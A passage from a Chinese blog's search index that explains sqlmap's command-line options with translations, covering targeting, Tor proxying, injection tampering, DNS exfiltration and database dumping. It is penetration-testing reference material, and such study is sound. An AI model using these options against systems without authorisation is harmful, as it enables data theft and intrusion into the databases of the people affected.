<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Sqlmap</title>
      <link href="/2023/03/20/Sqlmap/"/>
      <url>/2023/03/20/Sqlmap/</url>
      
        <content type="html"><![CDATA[<h1 id="工具介绍-Sqlmap"><a href="#工具介绍-Sqlmap" class="headerlink" title="工具介绍-Sqlmap"></a>工具介绍-Sqlmap</h1><p>由于Sqlmap 是常用工具之一，所以本篇的篇幅较长，详解一次所有参数。</p><p>1、Options（选项）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Usage: python sqlmap.py [options]</span><br><span class="line"></span><br><span class="line">Options（选项）:</span><br><span class="line">-h, --help Show basic help message and exit</span><br><span class="line"></span><br><span class="line">## 展示帮助文档 参数</span><br><span class="line"></span><br><span class="line">-hh Show advanced help message and exit</span><br><span class="line"></span><br><span class="line">## 展示详细帮助文档参数</span><br><span class="line"></span><br><span class="line">--version Show program&#x27;s version number and exit</span><br><span class="line"></span><br><span class="line">## 显示程序的版本号</span><br><span class="line"></span><br><span class="line">-v VERBOSE Verbosity level: 0-6 (default 1)</span><br><span class="line"></span><br><span class="line">## 详细级别：0-6（默认为1）</span><br></pre></td></tr></table></figure><p>2、Target（目标）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Target（目标）:</span><br><span class="line"></span><br><span class="line">At least one of these options has to be provided to define the target(s)</span><br><span class="line"></span><br><span class="line">-d DIRECT Connection string for direct database connection</span><br><span class="line">## 指定具体数据库</span><br><span class="line"></span><br><span class="line">-u URL, --url=URL Target URL (e.g. &quot;http://www.site.com/vuln.php?id=1&quot;)</span><br><span class="line">## 目标URL</span><br><span class="line"></span><br><span class="line">-l LOGFILE Parse target(s) from Burp or WebScarab proxy log file</span><br><span class="line">## 解析目标(s)从Burp或WebScarab代理日志文件</span><br><span class="line"></span><br><span class="line">-x SITEMAPURL Parse target(s) from remote sitemap(.xml) file</span><br><span class="line">## 解析目标(s)从远程站点地图文件(.xml)</span><br><span class="line"></span><br><span class="line">-m BULKFILE Scan multiple targets given in a textual file</span><br><span class="line">## 扫描文本文件中给出的多个目标</span><br><span class="line"></span><br><span class="line">-r REQUESTFILE Load HTTP request from a file</span><br><span class="line">## 从本地文件加载HTTP请求 ，多用于post注入。</span><br><span class="line"></span><br><span class="line">-g GOOGLEDORK Process Google dork results as target URLs</span><br><span class="line">## 处理Google的结果作为目标URL。</span><br><span class="line"></span><br><span class="line">-c CONFIGFILE Load options from a configuration INI file</span><br><span class="line">## 从INI配置文件中加载选项。</span><br></pre></td></tr></table></figure><p>3、Request（请求）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">Request（请求）:</span><br><span class="line"></span><br><span class="line">These options can be used to specify how to connect to the target URL</span><br><span class="line">## 这些选项可以用来指定如何连接到目标URL。</span><br><span class="line"></span><br><span class="line">--method=METHOD Force usage of given HTTP method (e.g. PUT)</span><br><span class="line">## 强制使用给定的HTTP方法（e.g. PUT）</span><br><span class="line"></span><br><span class="line">--data=DATA Data string to be sent through POST</span><br><span class="line">## 通过POST发送的数据字符串</span><br><span class="line"></span><br><span class="line">--param-del=PARA.. Character used for splitting parameter values</span><br><span class="line">## 用于拆分参数值的字符</span><br><span class="line"></span><br><span class="line">--cookie=COOKIE HTTP Cookie header value HTTP</span><br><span class="line">## Cookie头的值</span><br><span class="line"></span><br><span class="line">--cookie-del=COO.. Character used for splitting cookie values</span><br><span class="line">## 用于分割Cookie值的字符</span><br><span class="line"></span><br><span class="line">--load-cookies=L.. File containing cookies in Netscape/wget format</span><br><span class="line">## 包含Netscape / wget格式的cookie的文件</span><br><span class="line"></span><br><span class="line">--drop-set-cookie Ignore Set-Cookie header from response</span><br><span class="line">## 从响应中忽略Set-Cookie头</span><br><span class="line"></span><br><span class="line">--user-agent=AGENT HTTP User-Agent header value</span><br><span class="line">## 指定 HTTP User - Agent头</span><br><span class="line"></span><br><span class="line">--random-agent Use randomly selected HTTP User-Agent header value</span><br><span class="line">##  使用随机选定的HTTP User - Agent头</span><br><span class="line"></span><br><span class="line">--host=HOST HTTP Host header value</span><br><span class="line">## HTTP主机头值</span><br><span class="line"></span><br><span class="line">--referer=REFERER HTTP Referer header value</span><br><span class="line">##  指定 HTTP Referer头</span><br><span class="line"></span><br><span class="line">-H HEADER, --hea.. Extra header (e.g. &quot;X-Forwarded-For: 127.0.0.1&quot;)</span><br><span class="line">## 额外header</span><br><span class="line"></span><br><span class="line">--headers=HEADERS Extra headers (e.g. &quot;Accept-Language: fr\\nETag: 123&quot;)</span><br><span class="line">## 额外header</span><br><span class="line"></span><br><span class="line">--auth-type=AUTH.. HTTP authentication type (Basic, Digest, NTLM or PKI)HTTP</span><br><span class="line">## 认证类型(Basic, Digest, NTLM or PKI)</span><br><span class="line"></span><br><span class="line">--auth-cred=AUTH.. HTTP authentication credentials (name:password)</span><br><span class="line">##  HTTP认证凭证(name:password)</span><br><span class="line"></span><br><span class="line">--auth-file=AUTH.. HTTP authentication PEM cert/private key file</span><br><span class="line">## HTTP认证 PEM认证/私钥文件</span><br><span class="line"></span><br><span class="line">--ignore-401 Ignore HTTP Error 401 (Unauthorized)</span><br><span class="line">## 忽略HTTP错误401</span><br><span class="line"></span><br><span class="line">--proxy=PROXY Use a proxy to connect to the target URL</span><br><span class="line">## 使用代理连接到目标网址</span><br><span class="line"></span><br><span class="line">--proxy-cred=PRO.. Proxy authentication credentials (name:password)</span><br><span class="line">## 代理认证证书(name:password)</span><br><span class="line"></span><br><span class="line">--proxy-file=PRO.. Load proxy list from a file</span><br><span class="line">## 从文件中加载代理列表</span><br><span class="line"></span><br><span class="line">--ignore-proxy Ignore system default proxy settings</span><br><span class="line">## 忽略系统默认代理设置</span><br><span class="line"></span><br><span class="line">--tor Use Tor anonymity network</span><br><span class="line">## 使用Tor匿名网络</span><br><span class="line"></span><br><span class="line">--tor-port=TORPORT Set Tor proxy port other than default</span><br><span class="line">##  设置Tor代理端口而不是默认值</span><br><span class="line"></span><br><span class="line">--tor-type=TORTYPE Set Tor proxy type (HTTP (default), SOCKS4 or SOCKS5)</span><br><span class="line">## 设置Tor代理类型</span><br><span class="line"></span><br><span class="line">--check-tor Check to see if Tor is used properly</span><br><span class="line">## 检查Tor是否正确使用</span><br><span class="line"></span><br><span class="line">--delay=DELAY Delay in seconds between each HTTP request</span><br><span class="line">## 每个HTTP请求之间的延迟（秒）</span><br><span class="line"></span><br><span class="line">--timeout=TIMEOUT Seconds to wait before timeout connection (default 30)</span><br><span class="line">## 秒超时连接前等待（默认30）</span><br><span class="line"></span><br><span class="line">--retries=RETRIES Retries when the connection timeouts (default 3)</span><br><span class="line">##  连接超时时重试（默认值3）</span><br><span class="line"></span><br><span class="line">--randomize=RPARAM Randomly change value for given parameter(s)</span><br><span class="line">## 随机更改给定参数的值(s)</span><br><span class="line"></span><br><span class="line">--safe-url=SAFEURL URL address to visit frequently during testing</span><br><span class="line">## 在测试期间频繁访问的URL地址</span><br><span class="line"></span><br><span class="line">--safe-post=SAFE.. POST data to send to a safe URL</span><br><span class="line">## POST数据发送到安全URL</span><br><span class="line"></span><br><span class="line">--safe-req=SAFER.. Load safe HTTP request from a file</span><br><span class="line">## 从文件加载安全HTTP请求</span><br><span class="line"></span><br><span class="line">--safe-freq=SAFE.. Test requests between two visits to a given safe URL</span><br><span class="line">## 在两次访问给定安全网址之间测试请求</span><br><span class="line"></span><br><span class="line">--skip-urlencode Skip URL encoding of payload data</span><br><span class="line">## 跳过有效载荷数据的URL编码</span><br><span class="line"></span><br><span class="line">--csrf-token=CSR.. Parameter used to hold anti-CSRF token</span><br><span class="line">## 参数用于保存anti-CSRF令牌</span><br><span class="line"></span><br><span class="line">--csrf-url=CSRFURL URL address to visit to extract anti-CSRF token</span><br><span class="line">## 提取anti-CSRF URL地址访问令牌</span><br><span class="line"></span><br><span class="line">--force-ssl Force usage of SSL/HTTPS</span><br><span class="line">## 强制使用SSL /HTTPS</span><br><span class="line"></span><br><span class="line">--hpp Use HTTP parameter pollution method</span><br><span class="line">## 使用HTTP参数pollution的方法</span><br><span class="line"></span><br><span class="line">--eval=EVALCODE Evaluate provided Python code before the request (e.g. 评估请求之前提供Python代码&quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;)</span><br></pre></td></tr></table></figure><p>4、Optimization（优化）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Optimization（优化）:</span><br><span class="line"></span><br><span class="line">These options can be used to optimize the performance of sqlmap</span><br><span class="line">## 这些选项可用于优化sqlmap的性能</span><br><span class="line"></span><br><span class="line">-o Turn on all optimization switches</span><br><span class="line">## 开启所有优化开关</span><br><span class="line"></span><br><span class="line">--predict-output Predict common queries output</span><br><span class="line">## 预测常见的查询输出</span><br><span class="line"></span><br><span class="line">--keep-alive Use persistent HTTP(s) connections</span><br><span class="line">## 使用持久的HTTP（S）连接</span><br><span class="line"></span><br><span class="line">--null-connection Retrieve page length without actual HTTP response body</span><br><span class="line">## 从没有实际的HTTP响应体中检索页面长度</span><br><span class="line"></span><br><span class="line">--threads=THREADS Max number of concurrent HTTP(s) requests (default 1)</span><br><span class="line">## 最大的HTTP（S）请求并发量（默认为1）</span><br></pre></td></tr></table></figure><p>5、Injection（注入）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">Injection（注入）:</span><br><span class="line"></span><br><span class="line">These options can be used to specify which parameters to test for, provide custom injection payloads and optional tampering scripts</span><br><span class="line">##  这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。</span><br><span class="line"></span><br><span class="line">-p TESTPARAMETER Testable parameter(s)</span><br><span class="line">## 可测试的参数（S）</span><br><span class="line"></span><br><span class="line">--skip=SKIP Skip testing for given parameter(s)</span><br><span class="line">## 跳过对给定参数的测试</span><br><span class="line"></span><br><span class="line">--skip-static Skip testing parameters that not appear to be dynamic</span><br><span class="line">## 跳过测试不显示为动态的参数</span><br><span class="line"></span><br><span class="line">--param-exclude=.. Regexp to exclude parameters from testing (e.g. &quot;ses&quot;)</span><br><span class="line">## 使用正则表达式排除参数进行测试（e.g. &quot;ses&quot;）</span><br><span class="line"></span><br><span class="line">--dbms=DBMS Force back-end DBMS to this value</span><br><span class="line">## 强制后端的DBMS为此值</span><br><span class="line"></span><br><span class="line">--dbms-cred=DBMS.. DBMS authentication credentials (user:password)</span><br><span class="line">## DBMS认证凭证(user:password)</span><br><span class="line"></span><br><span class="line">--os=OS Force back-end DBMS operating system to this value</span><br><span class="line">## 强制后端的DBMS操作系统为这个值</span><br><span class="line"></span><br><span class="line">--invalid-bignum Use big numbers for invalidating values</span><br><span class="line">## 使用大数字使值无效</span><br><span class="line"></span><br><span class="line">--invalid-logical Use logical operations for invalidating values</span><br><span class="line">## 使用逻辑操作使值无效</span><br><span class="line"></span><br><span class="line">--invalid-string Use random strings for invalidating values</span><br><span class="line">## 使用随机字符串使值无效</span><br><span class="line"></span><br><span class="line">--no-cast Turn off payload casting mechanism</span><br><span class="line">## 关闭有效载荷铸造机制</span><br><span class="line"></span><br><span class="line">--no-escape Turn off string escaping mechanism</span><br><span class="line">## 关闭字符串转义机制</span><br><span class="line"></span><br><span class="line">--prefix=PREFIX Injection payload prefix string</span><br><span class="line">## 注入payload字符串前缀</span><br><span class="line"></span><br><span class="line">--suffix=SUFFIX Injection payload suffix string</span><br><span class="line">## 注入payload字符串后缀</span><br><span class="line"></span><br><span class="line">--tamper=TAMPER Use given script(s) for tampering injection data</span><br><span class="line">## 使用给定的脚本（S）篡改注入数据</span><br></pre></td></tr></table></figure><p>6、Detection（检测）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Detection（检测）:</span><br><span class="line">These options can be used to customize the detection phase</span><br><span class="line">## 这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</span><br><span class="line"></span><br><span class="line">--level=LEVEL Level of tests to perform (1-5, default 1)</span><br><span class="line">## 执行测试的等级（1-5，默认为1）</span><br><span class="line"></span><br><span class="line">--risk=RISK Risk of tests to perform (1-3, default 1)</span><br><span class="line">## 执行测试的风险（0-3，默认为1）</span><br><span class="line"></span><br><span class="line">--string=STRING String to match when query is evaluated to True</span><br><span class="line">##  查询时有效时在页面匹配字符串</span><br><span class="line"></span><br><span class="line">--not-string=NOT.. String to match when query is evaluated to False</span><br><span class="line">## 当查询求值为无效时匹配的字符串</span><br><span class="line"></span><br><span class="line">--regexp=REGEXP Regexp to match when query is evaluated to True</span><br><span class="line">## 查询时有效时在页面匹配正则表达式</span><br><span class="line"></span><br><span class="line">--code=CODE HTTP code to match when query is evaluated to True</span><br><span class="line">## 当查询求值为True时匹配的HTTP代码</span><br><span class="line"></span><br><span class="line">--text-only Compare pages based only on the textual content</span><br><span class="line">## 仅基于在文本内容比较网页</span><br><span class="line"></span><br><span class="line">--titles Compare pages based only on their titles</span><br><span class="line">##  仅根据他们的标题进行比较</span><br></pre></td></tr></table></figure><p>7、Techniques（技巧）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Techniques（技巧）:</span><br><span class="line">These options can be used to tweak testing of specific SQL injection techniques</span><br><span class="line">## 这些选项可用于调整具体的SQL注入测试。</span><br><span class="line"></span><br><span class="line">--technique=TECH SQL injection techniques to use (default &quot;BEUSTQ&quot;)</span><br><span class="line">## SQL 注入技术测试（默认BEUST）</span><br><span class="line"></span><br><span class="line">--time-sec=TIMESEC Seconds to delay the DBMS response (default 5)</span><br><span class="line">##  DBMS响应的延迟时间（默认为5秒）</span><br><span class="line"></span><br><span class="line">--union-cols=UCOLS Range of columns to test for UNION query SQL injection</span><br><span class="line">##  定列范围用于测试UNION查询注入</span><br><span class="line"></span><br><span class="line">--union-char=UCHAR Character to use for bruteforcing number of columns</span><br><span class="line">##  用于暴力猜解列数的字符</span><br><span class="line"></span><br><span class="line">--union-from=UFROM Table to use in FROM part of UNION query SQL injection</span><br><span class="line">##  要在UNION查询SQL注入的FROM部分使用的表</span><br><span class="line"></span><br><span class="line">--dns-domain=DNS.. Domain name used for DNS exfiltration attack</span><br><span class="line">##  域名用于DNS漏出攻击</span><br><span class="line"></span><br><span class="line">--second-order=S.. Resulting page URL searched for second-order response</span><br><span class="line">## 生成页面的URL搜索为second-order响应</span><br></pre></td></tr></table></figure><p>8、Fingerprint（指纹）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Fingerprint（指纹）:</span><br><span class="line"></span><br><span class="line">-f, --fingerprint Perform an extensive DBMS version fingerprint</span><br><span class="line">## 执行检查广泛的DBMS版本指纹</span><br></pre></td></tr></table></figure><p>9、Enumeration（枚举）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">Enumeration（枚举）:</span><br><span class="line"></span><br><span class="line">These options can be used to enumerate the back-end database management system information, structure and data contained in the tables. Moreover you can run your own SQL statements</span><br><span class="line">## 这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。</span><br><span class="line"></span><br><span class="line">-a, --all Retrieve everything</span><br><span class="line">## 检索一切</span><br><span class="line"></span><br><span class="line">-b, --banner Retrieve DBMS banner</span><br><span class="line">## 检索数据库管理系统的标识</span><br><span class="line"></span><br><span class="line">--current-user Retrieve DBMS current user</span><br><span class="line">##  检索数据库管理系统的 标识</span><br><span class="line"></span><br><span class="line">--current-db Retrieve DBMS current database</span><br><span class="line">## 检索数据库管理系统当前数据库</span><br><span class="line"></span><br><span class="line">-hostname Retrieve DBMS server hostname</span><br><span class="line">## 检索数据库服务器的主机名</span><br><span class="line"></span><br><span class="line">--is-dba Detect if the DBMS current user is DBA</span><br><span class="line">## 检测DBMS当前用户是否DBA</span><br><span class="line"></span><br><span class="line">--users Enumerate DBMS users</span><br><span class="line">## 枚举数据库管理系统用户</span><br><span class="line"></span><br><span class="line">--passwords Enumerate DBMS users password hashes</span><br><span class="line">## 枚举数据库管理系统用户密码哈希</span><br><span class="line"></span><br><span class="line">--privileges Enumerate DBMS users privileges</span><br><span class="line">## 枚举数据库管理系统用户的权限</span><br><span class="line"></span><br><span class="line">--roles Enumerate DBMS users roles</span><br><span class="line">## 枚举数据库管理系统用户的角色</span><br><span class="line"></span><br><span class="line">--dbs Enumerate DBMS databases</span><br><span class="line">## 枚举数据库管理系统数据库</span><br><span class="line"></span><br><span class="line">--tables Enumerate DBMS database tables</span><br><span class="line">##  枚举的DBMS数据库中的表</span><br><span class="line"></span><br><span class="line">--columns Enumerate DBMS database table columns</span><br><span class="line">## 枚举DBMS数据库表列</span><br><span class="line"></span><br><span class="line">--schema Enumerate DBMS schema</span><br><span class="line">## 枚举数据库架构</span><br><span class="line"></span><br><span class="line">--count Retrieve number of entries for table(s)</span><br><span class="line">## 检索表的条目数</span><br><span class="line"></span><br><span class="line">--dump Dump DBMS database table entries</span><br><span class="line">##  转储数据库管理系统的数据库中的表项</span><br><span class="line"></span><br><span class="line">--dump-all Dump all DBMS databases tables entries</span><br><span class="line">## 转储数据库管理系统的数据库中的表项</span><br><span class="line"></span><br><span class="line">--search Search column(s), table(s) and/or database name(s)</span><br><span class="line">##  搜索列（S），表（S）和/或数据库名称（S）</span><br><span class="line"></span><br><span class="line">--comments Retrieve DBMS comments</span><br><span class="line">##  检索数据库的comments(注释、评论)</span><br><span class="line"></span><br><span class="line">-D DB DBMS database to enumerate</span><br><span class="line">## 要进行枚举的数据库名</span><br><span class="line"></span><br><span class="line">-T TBL DBMS database table(s) to enumerate</span><br><span class="line">##  要进行枚举的数据库表</span><br><span class="line"></span><br><span class="line">-C COL DBMS database table column(s) to enumerate</span><br><span class="line">## 要进行枚举的数据库列</span><br><span class="line"></span><br><span class="line">-X EXCLUDECOL DBMS database table column(s) to not enumerate</span><br><span class="line">## 要不进行枚举的数据库列</span><br><span class="line"></span><br><span class="line">-U USER DBMS user to enumerate</span><br><span class="line">## 用来进行枚举的数据库用户</span><br><span class="line"></span><br><span class="line">--exclude-sysdbs Exclude DBMS system databases when enumerating tables</span><br><span class="line">##  枚举表时排除系统数据库</span><br><span class="line"></span><br><span class="line">--pivot-column=P.. Pivot column name</span><br><span class="line">## 主列名称</span><br><span class="line"></span><br><span class="line">--where=DUMPWHERE Use WHERE condition while table dumping</span><br><span class="line">## 使用WHERE条件进行表转储</span><br><span class="line"></span><br><span class="line">--start=LIMITSTART First query output entry to retrieve</span><br><span class="line">##  第一个查询输出进入检索</span><br><span class="line"></span><br><span class="line">--stop=LIMITSTOP Last query output entry to retrieve</span><br><span class="line">## 最后查询的输出进入检索</span><br><span class="line"></span><br><span class="line">--first=FIRSTCHAR First query output word character to retrieve</span><br><span class="line">## 第一个查询输出字的字符检索</span><br><span class="line"></span><br><span class="line">--last=LASTCHAR Last query output word character to retrieve</span><br><span class="line">## 最后查询的输出字字符检索</span><br><span class="line"></span><br><span class="line">--sql-query=QUERY SQL statement to be executed</span><br><span class="line">## 要执行的SQL语句</span><br><span class="line"></span><br><span class="line">--sql-shell Prompt for an interactive SQL shell</span><br><span class="line">## 提示交互式SQL的shell</span><br><span class="line"></span><br><span class="line">--sql-file=SQLFILE Execute SQL statements from given file(s)</span><br><span class="line">## 从给定文件执行SQL语句</span><br></pre></td></tr></table></figure><p>10、Brute Force（蛮力）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Brute force（蛮力）:</span><br><span class="line"></span><br><span class="line">These options can be used to run brute force checks</span><br><span class="line">## 这些选项可以被用来运行蛮力检查。</span><br><span class="line"></span><br><span class="line">--common-tables Check existence of common tables</span><br><span class="line">## 检查存在共同表</span><br><span class="line"></span><br><span class="line">--common-columns Check existence of common columns</span><br><span class="line">## 检查存在共同列</span><br></pre></td></tr></table></figure><p>11、User-defined function injection（用户自定义函数注入）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">User-defined function injection（用户自定义函数注入）:</span><br><span class="line"></span><br><span class="line">These options can be used to create custom user-defined functions</span><br><span class="line">## 这些选项可以用来创建用户自定义函数。</span><br><span class="line"></span><br><span class="line">--udf-inject Inject custom user-defined functions</span><br><span class="line">## 注入用户自定义函数</span><br><span class="line"></span><br><span class="line">--shared-lib=SHLIB Local path of the shared library</span><br><span class="line">## 共享库的本地路径</span><br></pre></td></tr></table></figure><p>12、File system access（访问文件系统）</p><figure class="highlight plaintext"><table><tr><td 